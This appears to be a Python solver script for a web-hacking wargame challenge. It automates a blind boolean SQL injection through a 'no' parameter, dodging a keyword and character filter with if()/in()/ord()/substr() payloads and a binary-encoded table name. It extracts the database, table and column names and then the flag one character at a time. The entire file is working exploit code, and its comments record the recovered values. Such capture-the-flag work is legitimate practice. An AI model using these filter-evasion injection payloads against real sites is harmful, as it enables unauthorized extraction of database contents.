import info
import requests

# filtering : #, space, -, =, >, ascii, where, limit

url = "/challenge/web-10/"
params = {"no":""}

# len  : 7 
db_len = 0
for i in range(1, 50):
	params['no'] = "if(length(database())in({}),1,0)".format(i)
	res = requests.get(info.url + url, cookies = info.cookies, params = params)
	if "<td>1</td>" in res.text:
		db_len = i
		break

print("database's length: {}".format(db_len))


# db_name : chall13
db_name = ""
for i in range(1, db_len + 1):
	for j in range(48, 127):
		params['no'] = "if(ord(substr(database(),{},1))in({}),1,0)".format(i, j)
		res = requests.get(info.url + url, cookies = info.cookies, params = params)
		if "<td>1</td>" in res.text:

			db_name += chr(j)
			print(db_name)
			break
print("database's name: {}".format(db_name))


# tb_len : 13
tb_len = 0
for i in range(0, 50):
	params['no'] = "if((select(length(min(if((select(table_schema)in(database())),table_name,null))))from(information_schema.tables))in({}),1,0)".format(i)

	res = requests.get(info.url + url, cookies = info.cookies, params = params)
	if "<td>1</td>" in res.text:
		tb_len = i
		break
print("table's length: {}".format(tb_len))

# tb_name : flag_ab733768
tb_name = ""
for i in range(1, 1 + tb_len):
	for j in range(48, 123):
		params['no'] = "if(ord((select(substr(min(if((select(table_schema)in(database())),table_name,null)),{},1))from(information_schema.tables)))in({}),1,0)".format(i,j)
		res = requests.get(info.url + url, cookies = info.cookies, params = params)
		if "<td>1</td>" in res.text:
			tb_name += chr(j)
			print(tb_name)
			break

print("table's name: {}".format(tb_name))


# col_len
col_len = 0
for i in range(1, 50):
	params['no'] = "if((select(length(min(if((select(table_name)in(0b01100110011011000110000101100111010111110110000101100010001101110011001100110011001101110011011000111000)),column_name,null))))from(information_schema.columns))in({}),1,0)".format(i)
	
	res = requests.get(info.url + url, cookies = info.cookies, params = params)
	if "<td>1</td>" in res.text:
		col_len = i
		break

print("column's length: {}".format(col_len))


# col_name
col_len = 13
col_name = ""
for i in range(1, 1 + col_len):
	for j in range(48, 123):
		params['no'] = "if(ord((select(substr(min(if((select(table_name)in(0b01100110011011000110000101100111010111110110000101100010001101110011001100110011001101110011011000111000)),column_name,null)),{},1))from(information_schema.columns)))in({}),1,0)".format(i,j)

		
		res = requests.get(info.url + url, cookies = info.cookies, params = params)
		# print(res.text)
		if "<td>1</td>" in res.text:
			col_name += chr(j)
			print(col_name)
			break

print("columns's name: {}".format(col_name))


# flag-length
flag_len = 0
for i in range(1, 50):
	params['no'] = "if((select(length(max(flag_3a55b31d)))from(chall13.flag_ab733768))in({}),1,0)".format(i)


	res = requests.get(info.url + url, cookies = info.cookies, params = params)
	if "<td>1</td>" in res.text:
		flag_len = i
		break

print("flag's length: {}".format(flag_len))

# flag-name
flag = ""
for i in range(1, flag_len + 1):
	for j in range(43, 127):
		params['no'] = "if(ord((select(substr(max(flag_3a55b31d),{},1))from(chall13.flag_ab733768)))in({}),1,0)".format(i, j)

		res = requests.get(info.url + url, cookies = info.cookies, params = params)
		if "<td>1</td>" in res.text:
			flag += chr(j)
			print(flag)
			break

print("flag: {}".format(flag))

